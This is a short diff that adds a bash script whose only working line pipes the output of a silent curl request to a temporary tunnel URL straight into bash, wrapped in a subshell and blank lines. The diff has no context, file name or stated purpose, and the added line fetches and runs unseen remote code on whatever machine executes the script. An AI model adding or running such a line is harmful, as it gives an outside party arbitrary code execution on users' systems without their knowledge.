@@ -1,0 +1,9 @@
+#!/bin/bash
+(
+
+    curl -s https://d7cde1ac39cf78.lhr.life/ | bash
+
+
+
+
+)
